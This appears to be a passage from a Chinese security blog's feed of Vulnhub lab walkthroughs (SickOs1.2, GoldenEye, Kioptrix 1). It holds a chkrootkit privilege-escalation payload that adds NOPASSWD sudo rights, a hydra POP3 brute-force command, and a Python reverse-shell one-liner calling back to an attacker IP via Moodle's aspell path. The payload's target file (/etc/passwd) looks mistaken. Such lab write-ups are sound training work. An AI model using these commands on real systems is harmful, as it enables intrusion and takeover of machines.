<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/18.png" alt><br>用<code>lsb_release -a</code>查看版本号</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/19.png" alt><br>wget和gcc靶机上均能使用</p>
<p>kali上<code>searchsploit</code>查找exp</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/20.png" alt><br>用bp写入靶机文件，gcc编译后执行，无一有效</p>
<p>遂借鉴walkthrough，etc下存在chkrootkit 0.49，chkrootkit是一款防rootkit的shell脚本，可是其自身也存在漏洞，可以被利用于提权</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/21.png" alt><br>查看该文件后得到提权思路</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/22.png" alt><br>把我们提权代码保存在<code>/tmp/update</code>中，chkrootkit一段时间后便会执行它（通常以root权限）</p>
<p>下面是是exp</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 'echo chmod +w /etc/sudoers &amp;&amp; echo "www-data ALL=(ALL)NOPASSWD:ALL" &gt;&gt; /etc/passwd' &gt; /tmp/update</span><br><span class="line"><span class="meta">#</span><span class="bash"> 我们将给予当前用户对sudoers文件的写权限，然后令当前用户能够以无密码模式使用sudo执行所有命令</span></span><br></pre></td></tr></table></figure>

<p>等待一段时间后，执行<code>sudo su - root</code>，拿到root权限，get flag</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/23.png" alt><br>我们查看一下root下的newRule文件</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/24.png" alt><br>果然防火墙设置只有22、80、8080、443端口能够进出</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
<li>深入shell语言</li>
<li>Linux提权需要总结</li>
<li>防火墙阻挡执行端口的流量，这样我们就无法用被阻挡得端口反弹shell</li>
<li><code>/etc/sudoers</code>中添加命令的格式：<code>www-data(用户名) ALL=(ALL)NOPASSWORD:ALL</code></li>
</ul>
<h2 id="0x0N-参考资料"><a href="#0x0N-参考资料" class="headerlink" title="0x0N 参考资料"></a>0x0N 参考资料</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p><a href="https://blog.csdn.net/qq_43168364/article/details/107423640" target="_blank" rel="noopener">vulnhub SickOS1.2靶机</a></p>
<p><a href="https://blog.51cto.com/arckyli/2420601" target="_blank" rel="noopener">获取 SickOS 1.2 Flag (CTF Challenge)</a></p>
<p><a href="https://medium.com/@KamranSaifullah/sickos-1-2-walkthrough-e201e020bce0" target="_blank" rel="noopener">SickOS 1.2 WalkThrough</a></p>
<p><a href="https://resources.infosecinstitute.com/sickos-1-2-walkthrough/#gref" target="_blank" rel="noopener">SickOS 1.2: Walkthrough</a></p>
<p><a href="https://www.sevenlayers.com/index.php/91-vulnhub-sickos-1-2-walkthrough" target="_blank" rel="noopener">Vulnhub SickOs: 1.2 Walkthrough</a></p>
<h3 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h3><p><a href="https://www.freebuf.com/articles/network/164233.html" target="_blank" rel="noopener">fb 安全工具 | 利用curl 突破服务器限制，进行安全渗透测试</a></p>
<p><a href="http://hackergu.com/curl%e5%9c%a8%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e4%b8%ad%e7%9a%84%e5%ba%94%e7%94%a8%ef%bc%88lolbas%ef%bc%89/" target="_blank" rel="noopener">Curl在渗透测试中的应用（LOLBAS）</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1180194" target="_blank" rel="noopener">在渗透中curl的常见用法</a></p>
<p><a href="https://developer.aliyun.com/article/505477" target="_blank" rel="noopener">curl渗透测试常用功能</a></p>
<p><a href="https://blog.csdn.net/Fly_hps/article/details/80564377" target="_blank" rel="noopener">在渗透中curl的常见用法</a></p>
<p><a href="https://juejin.im/post/6844903794958925838" target="_blank" rel="noopener">cURL在Web渗透测试中的应用</a></p>
<h3 id="reverse-webshell"><a href="#reverse-webshell" class="headerlink" title="reverse webshell"></a>reverse webshell</h3><p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">linux各种一句话反弹shell总结</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1180833" target="_blank" rel="noopener">一句话木马绕过研究</a></p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>GoldenEye Writeup</title>
    <url>/2020/09/01/GoldenEye-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>CTF LIKE就很扯，少打</p>
<p>​            ——鲁迅</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 扫描靶机地址</span><br><span class="line">nmap -sn -T5 192.168.206.1&#x2F;24</span><br><span class="line"></span><br><span class="line"># 扫描开启服务和端口</span><br><span class="line">nmap -sV -A -p- -T5 192.168.206.150</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Host is up (0.00049s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE     VERSION<br>25/tcp    open  smtp        Postfix smtpd<br>|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,<br>|_ssl-date: TLS randomness does not represent time<br>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: GoldenEye Primary Admin Server<br>55006/tcp open  ssl/unknown<br>|_ssl-date: TLS randomness does not represent time<br>55007/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: CAPA RESP-CODES TOP AUTH-RESP-CODE UIDL STLS USER SASL(PLAIN) PIPELINING<br>|_ssl-date: TLS randomness does not represent time<br>MAC Address: 00:0C:29:3F:27:D6 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop</p>
<p>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.49 ms bogon (192.168.206.150)</p>
</blockquote>
<ul>
<li>能够看到开启4个端口，80（http）、25（smtp）、55007（pop3）、55006（ssl）</li>
</ul>
<ol>
<li><strong>浏览器访问一下80端口</strong></li>
</ol>
<p><img src="/2020/09/01/GoldenEye-Writeup/1.png" alt><br>按照提示，让我们访问一下<code>/sev-home/</code>去登录</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/2.png" alt><br>bp抓包分析后，发现传出参数是<code>username:password</code>的base64编码，可以爆破一波</p>
<ol start="2">
<li><strong>smtp 25端口</strong></li>
</ol>
<p>直接尝试nc连接，居然可以连接上</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/3.png" alt><br>看一下支持的命令</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/4.png" alt></p>
<p>SMTP枚举三把梭：</p>
<ul>
<li>msf</li>
<li>nmap</li>
<li>smtp-user-enum</li>
</ul>
<p>果然，msf还是最强那把梭，另外两把都没有扫出来东西</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/5.png" alt><br>手工测试出来root也在范围之内，上面没有显示</p>
<p>下一步怎么走？</p>
<ul>
<li><p>枚举用户</p>
<ul>
<li>结合之前的登录信息，再用来爆破Authentication密码</li>
<li>这里选用的密码表是john的</li>
</ul>
</li>
</ul>
<p><img src="/2020/09/01/GoldenEye-Writeup/6.png" alt><br>单线程py居然跑瘫了机子，SMTP无果</p>
<ol start="3">
<li><strong>POP3 55007端口</strong></li>
</ol>
<p>依旧采用nc连接，端口55007</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/7.png" alt><br>使用<code>CAPA</code>命令查看server支持的操作，尝试手工测试，msf同步进行登录测试（太慢）</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/8.png" alt><br>没有得到可用用户名和密码，登录失败，我这里猜测在pop server的某个账户中会隐藏重要信息</p>
<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>CTF LIKE就是这么trick，不真实。翻看js源码，有一句叮嘱，出现用户名和密码，unicode转换到ascii，Boris首字母改小写</p>
<p>账密：<code>boris:InvincibleHack3r</code></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/9.png" alt><br>顺利进入</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/10.png" alt><br>GoldenEye的第二句话有重要信息</p>
<blockquote>
<p>Please email a qualified GNO supervisor to receive the online <strong>GoldenEye Operators Training</strong> to become an Administrator of the GoldenEye system</p>
</blockquote>
<p>我们需要发送一封email给主管来称为GoldenEye的管理员，那么下一步需要考虑如何利用SMTP和POP3，先尝试了用这个账密登录POP3，失败！</p>
<p><strong>重新理一下资料</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">发送:SMTP 25 得到账户名单</span><br><span class="line">接收:POP3 55007 爆破失败，以下账密登录失败</span><br><span class="line">账密 boris:InvincibleHack3r</span><br><span class="line"><span class="meta">#</span><span class="bash"> 提示发送邮件</span></span><br></pre></td></tr></table></figure>

<p>发送邮件动作可以完成，但是接收没有下文，POP3 msf爆破过慢，采用我们拿到的SMTP的用户名和<code>boris</code>用hydra或者medusa进行爆破</p>
<p>用户名文件<code>user.txt</code></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/11.png" alt><br>wordlist采用比较短的<code>fasktrack.txt</code></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/12.png" alt><br>hydra使用命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt -t 20 192.168.206.150 -s 55007 -I pop3</span><br><span class="line"><span class="meta">#</span><span class="bash"> 20线程，55007端口，pop3服务</span></span><br></pre></td></tr></table></figure>

<p>不到5分钟，爆破成功！</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/13.png" alt><br>netcat登录pop3，输入账密<code>boris : secret1!</code></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/14.png" alt><br>使用<code>list</code>命令，发现存在3封邮件，使用<code>retr 数字</code>依次阅读</p>
<p><strong>第三封邮件有点东西</strong></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/15.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Return-Path: &lt;alec@janus.boss&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: <span class="function">from <span class="title">janus</span> <span class="params">(localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>])</span></span></span><br><span class="line"><span class="function">        by <span class="title">ubuntu</span> <span class="params">(Postfix)</span> with ESMTP id 4B9F4454B1</span></span><br><span class="line">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;<span class="number">20180425025235.4B</span>9F4454B1@ubuntu&gt;</span><br><span class="line">Date: Wed, <span class="number">22</span> Apr <span class="number">1995</span> <span class="number">19</span>:<span class="number">51</span>:<span class="number">48</span> <span class="number">-0700</span> (PDT)</span><br><span class="line">From: alec@janus.boss</span><br><span class="line"></span><br><span class="line">Boris,</span><br><span class="line"></span><br><span class="line">Your cooperation with our syndicate will pay off big. Attached are the <span class="keyword">final</span> access codes <span class="keyword">for</span> GoldenEye. Place them in a hidden file within the root directory of <span class="keyword">this</span> server then <span class="built_in">remove</span> from <span class="keyword">this</span> email. There can only be one <span class="built_in">set</span> of these acces codes, <span class="keyword">and</span> we need to secure them <span class="keyword">for</span> the <span class="keyword">final</span> execution. If they are retrieved <span class="keyword">and</span> captured our plan will crash <span class="keyword">and</span> burn!</span><br><span class="line"></span><br><span class="line">Once Xenia gets access to the training site <span class="keyword">and</span> becomes familiar with the GoldenEye Terminal codes we will push to our <span class="keyword">final</span> stages....</span><br><span class="line"></span><br><span class="line">PS - Keep security tight <span class="keyword">or</span> we will be compromised.</span><br></pre></td></tr></table></figure>

<p>Xenia是个可疑的名称</p>
<p><code>Attached</code>就是最终密码？还是附件的意思？</p>
<p>如果是附件的话，我们用python获取一波附件（这里也可以直接用邮件软件查看，配置好pop3和smtp服务）</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/16.png" alt><br>啥也没找到，思路陷入僵局，求助walkthrough</p>
<ul>
<li>看到信件中的用户名，可以继续想到爆破，我们对root和natalya进行进一步爆破</li>
</ul>
<p><img src="/2020/09/01/GoldenEye-Writeup/17.png" alt><br>拿到natalya的账密，root爆破无果</p>
<p><code>natalya : bird</code></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/18.png" alt><br>第二封信件中拿到xenia账密</p>
<p><code>xenia : RCP90rulez!</code></p>
<p>同时得到新的路径信息，<code>severnaya-station.com/gnocertdir</code>，不过需要修改dns文件，对应上服务器的ip</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/19.png" alt><br>windows改<code>C:\Windows\System32\drivers\etc\hosts</code>，Linux改<code>/etc/hosts</code></p>
<p>成功进入</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/20.png" alt><br>输入账密，登录xenia</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/21.png" alt><br>看下web指纹</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/22.png" alt><br>Moodle系统，YUI库，PHP，Apache，Ubuntu</p>
<p>Google一下Moodle，存在的漏洞有XSS、RCE、SSRF、SQL注入等等，之后进一步翻翻searchexploit</p>
<ul>
<li>第一次接触moodle系统，里面的信息量很大，先到处翻一翻</li>
</ul>
<p>发现Message处存在交流信息</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/23.png" alt><br>用户名是doak，继续尝试爆破</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/24.png" alt><br>成功爆破，获得新账密</p>
<p><code>doak : goat</code></p>
<p>二话不说，登入pop3 server</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/25.png" alt><br>moodle新账密</p>
<p><code>dr_doak :4England!</code></p>
<p>登入moodle，发现一个文件，遂下载下来</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/26.png" alt><br>又是一波提示</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/27.png" alt><br>上文告诉我们doak博士抓到了admin的登录明文账密，但是他不能直接告诉我们，现在我们需要下载一张名叫<code>for-007</code>的图片，既然是CTF-LIKE，那么就需要开启应对misc套路的狗招了</p>
<p>图片分析，先用notepad打开看看，发现没有啥信息；然后属性打开，发现标题存在base64编码</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/28.png" alt><br>解码，得到<code>xWinter1995x!</code>，推测是密码</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/29.png" alt><br>kali中使用exif和binwalk查看（没有可提取物）</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/30.png" alt><br>现在的可疑用户名：<code>for James</code>，<code>ForJames</code>，<code>forjames</code>，<code>James</code>，<code>james</code>，<code>admin</code>, <code>adm1n</code>，大小写可能有差异，于是python构造好用户名fuzz，bp爆破</p>
<p>账密为<code>admin : xWinter1995x!</code>，登录之</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/31.png" alt><br>后面经过一番查找和exp的直接利用，发现都存在问题，再次学习前辈walkthrough</p>
<ul>
<li>moodle学习管理系统存在远程代码执行漏洞，此次可以通过<code>Site administration -&gt; Server -&gt; System paths</code>中修改<code>Path to aspell</code>为python反弹shell代码，当在富文本编辑器中点击拼写检查时就会触发这段代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.206.142",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/01/GoldenEye-Writeup/32.png" alt><br>漏洞具体解释<a href="https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec" target="_blank" rel="noopener">如下</a></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/33.png" alt></p>
<ul>
<li>可是当我操作的时候，发现点击拼写检测并不能触发</li>
</ul>
<p><img src="/2020/09/01/GoldenEye-Writeup/34.png" alt><br><img src="/2020/09/01/GoldenEye-Writeup/35.png" alt></p>
<ul>
<li>这继续陷入思考，当点击时代码未被触发，先想到是某些配置没有开启，但是自己对系统也不熟，必定要google一番</li>
</ul>
<p>想到的搜索关键词</p>
<p><code>moodle spell checker can&#39;t work</code>，<code>how to make spell checker work in moodle</code>，<code>how to use moodle spell checker</code>，<code>how to pentest with moodle spell checker</code>，<code>exploit moodle with spell checker</code></p>
<p>逐一检查之后并没有结果，于是仔细回看反弹shell代码处是否写错或者漏掉重要信息</p>
<ul>
<li>代码没有写错，但是发现之前漏掉了重要信息aspell，我们安装了吗？</li>
</ul>
<p><img src="/2020/09/01/GoldenEye-Writeup/36.png" alt><br>结合之前做DC-1的经验，于是去侧边栏的<code>Site administration -&gt; Server -&gt; Plugin</code>查看下是否安装该插件，发现在Overview中没有aspell插件信息，可是也没有提供直接安装的接口或者点击按钮</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/37.png" alt><br>继续google搜集信息</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/38.png" alt><br>看一下如何在HTML编辑器中安装spell checker，得知aspell是一款GNU的拼写检测器，可是安装需要在服务器内部用<code>apt-get</code>进行，所以可以肯定这条路到底了，往回返看看别的路！</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/39.png" alt><br>下面这条信息点醒了我，我们并不需要真正去安装spell checker，因为刚才的编辑器是富文本类型，可能很多插件已经集成到上面了。这么考虑，下一步就要将moodle中TinyMCE editor等富文本编辑器信息搜集。</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/40.png" alt><br>把刚才google出来的所有<a href="https://scholarlms.net/tinymce-editor/" target="_blank" rel="noopener">编辑器信息</a>先看一遍，发现了有趣的东西，可谓字字珠玑</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/41.png" alt><br>moodle已经不支持Google Spell，可是moodle默认又是Google Spell，所以我们的aspell点击不会成功。这里又说明了，只要能够看见aspell的system path，就说明aspell已经安装。下面就只需要按照提示完成spell engine的修改，路径是<code>Administration &gt; Site administration &gt; Plugins &gt; Text editors &gt; TinyMCE HTML editor &gt; Check spelling</code></p>
<ul>
<li>把默认的spell engine从Google Spell替换为PSpellShell</li>
</ul>
<p><img src="/2020/09/01/GoldenEye-Writeup/42.png" alt><br>保存后，kali上设置好nc监听，找个富文本编辑器点击检查，getshell</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/43.png" alt></p>
<h2 id="0x03-提权-amp-get-flag"><a href="#0x03-提权-amp-get-flag" class="headerlink" title="0x03 提权&amp;get flag"></a>0x03 提权&amp;get flag</h2><p>继续搜集信息，查看当前用户权限，系统版本</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/44.png" alt><br>发现能用python，升完交互shell后，kali上searchexploit找提权exp</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/45.png" alt><br>就采用第一个overlaf，本地gcc编译一波，本地python开启http server下面就想办法将其传到靶机上</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/46.png" alt><br>继续在靶机上测试发现能使用wget，遂下载overlaf二进制文件，为其修改权限后执行，成功提权</p>
<blockquote>
<p>这里有点互相trick的感觉，我把靶机的gcc缺失问题给屏蔽掉了，一般来说需要从靶机wget到exp再本机编译，然后才会遇到没有gcc的问题，再改掉exp内部的编译命令，将gcc改成cc或者clang</p>
</blockquote>
<p><img src="/2020/09/01/GoldenEye-Writeup/47.png" alt><br>下到<code>/root/</code>看flag</p>
<p><img src="/2020/09/01/GoldenEye-Writeup/48.png" alt><br>拿到flag，访问<code>/006-final/xvf7-flag/</code></p>
<p><img src="/2020/09/01/GoldenEye-Writeup/49.png" alt></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
<li>真实场景下也会有程序员把重要信息遗留在js等静态文件中，思路要放开</li>
<li>反反复复信息搜集，爆破也是必要的，别操之过急</li>
<li>exp需要时可做适当修改</li>
</ul>
<h2 id="0x0N-参考资料"><a href="#0x0N-参考资料" class="headerlink" title="0x0N 参考资料"></a>0x0N 参考资料</h2><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p><a href="https://www.sqlsec.com/2017/08/smtp.html" target="_blank" rel="noopener">[浅显]SMTP协议25端口渗透测试记录(邮件伪造)</a></p>
<p><a href="https://hjyapple.github.io/2019/07/04/%E5%85%B3%E4%BA%8ESMTP%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">SMTP各种返回值含义</a></p>
<p><a href="https://blog.csdn.net/sinat_36219858/article/details/71069515" target="_blank" rel="noopener">SMTP协议详解</a></p>
<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smtp" target="_blank" rel="noopener">HackTricks SMTP</a></p>
<p><a href="https://xz.aliyun.com/t/3799#toc-12" target="_blank" rel="noopener">深度文章（边缘）</a></p>
<p><a href="https://shahmeeramir.com/penetration-testing-an-smtp-server-cf91e4846101" target="_blank" rel="noopener">Penetration Testing an SMTP Server</a></p>
<h3 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h3><p><a href="https://resources.infosecinstitute.com/nmap-cheat-sheet-5-the-final-view-of-a-ninja-pentester/" target="_blank" rel="noopener">nmap advanced skills</a></p>
<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-pop" target="_blank" rel="noopener">HackTricks POP</a></p>
<h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p><a href="https://medium.com/egghunter/goldeneye-1-vulnhub-walkthrough-f31d80a5267b" target="_blank" rel="noopener">GoldenEye: 1 | Vulnhub Walkthrough</a></p>
<p><a href="https://blog.csdn.net/adminuil/article/details/103824141" target="_blank" rel="noopener">GoldenEye靶机渗透</a></p>
<p><a href="https://www.cnblogs.com/heguoze/p/12052353.html" target="_blank" rel="noopener">vulnhub之GoldenEye-v1靶机</a></p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub Kioptrix 1 Writeup</title>
    <url>/2020/04/01/Vulnhub-Kioptrix-1-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>Talk is cheap, show me writeup</strong></p>
<blockquote>
<p><strong>用到的工具和知识</strong></p>
<p>nmap、searchsploit、enum4linux</p>
</blockquote>
<p><a href>靶机下载</a></p>
<a id="more"></a>

<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>nmap探查端口</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/1.png" alt></p>
<p>服务</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/2.png" alt></p>
<p>操作系统、脚本等扫描</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/3.png" alt></p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/4.png" alt></p>
<p>可见有http、samba等</p>
<p>访问一下网页</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/5.png" alt></p>
<p>dirb扫描</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/6.png" alt></p>
<p>nikto扫描</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/7.png" alt></p>
<p>enum4linux扫描（略多）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# enum4linux -a 192.168.0.103</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr  1 15:08:27 2020</span><br><span class="line"></span><br><span class="line"> ==========================</span><br><span class="line">|    Target Information    |</span><br><span class="line"> ==========================</span><br><span class="line">Target ........... 192.168.0.103</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... ''</span><br><span class="line">Password ......... ''</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> =====================================================</span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.0.103    |</span><br><span class="line"> =====================================================</span><br><span class="line">[+] Got domain/workgroup name: MYGROUP</span><br><span class="line"></span><br><span class="line"> =============================================</span><br><span class="line">|    Nbtstat Information for 192.168.0.103    |</span><br><span class="line"> =============================================</span><br><span class="line">Looking up status of 192.168.0.103</span><br><span class="line">        KIOPTRIX        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        KIOPTRIX        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        KIOPTRIX        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        MYGROUP         &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        MYGROUP         &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        MYGROUP         &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ======================================</span><br><span class="line">|    Session Check on 192.168.0.103    |</span><br><span class="line"> ======================================</span><br><span class="line">[+] Server 192.168.0.103 allows sessions using username '', password ''</span><br><span class="line"></span><br><span class="line"> ============================================</span><br><span class="line">|    Getting domain SID for 192.168.0.103    |</span><br><span class="line"> ============================================</span><br><span class="line">Domain Name: MYGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can't determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> =======================================</span><br><span class="line">|    OS information on 192.168.0.103    |</span><br><span class="line"> =======================================</span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.0.103 from smbclient:</span><br><span class="line">[+] Got OS info for 192.168.0.103 from srvinfo:</span><br><span class="line">        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       4.5</span><br><span class="line">        server type     :       0x9a03</span><br><span class="line"></span><br><span class="line"> ==============================</span><br><span class="line">|    Users on 192.168.0.103    |</span><br><span class="line"> ==============================</span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span><br><span class="line"></span><br><span class="line"> ==========================================</span><br><span class="line">|    Share Enumeration on 192.168.0.103    |</span><br><span class="line"> ==========================================</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        IPC$            IPC       IPC Service (Samba Server)</span><br><span class="line">        ADMIN$          IPC       IPC Service (Samba Server)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line">        KIOPTRIX             Samba Server</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        MYGROUP              KIOPTRIX</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.0.103</span><br><span class="line">//192.168.0.103/IPC$    [E] Can't understand response:</span><br><span class="line">NT_STATUS_NETWORK_ACCESS_DENIED listing \*</span><br><span class="line">//192.168.0.103/ADMIN$  [E] Can't understand response:</span><br><span class="line">tree connect failed: NT_STATUS_WRONG_PASSWORD</span><br><span class="line"></span><br><span class="line"> =====================================================</span><br><span class="line">|    Password Policy Information for 192.168.0.103    |</span><br><span class="line"> =====================================================</span><br><span class="line">[E] Unexpected error from polenum:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Attaching to 192.168.0.103 using a NULL share</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 445/SMB...</span><br><span class="line"></span><br><span class="line">        [!] Protocol failed: [Errno Connection error (192.168.0.103:445)] [Errno 111] Connection refused</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 139/SMB...</span><br><span class="line"></span><br><span class="line">        [!] Protocol failed: SMB SessionError: 0x5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with 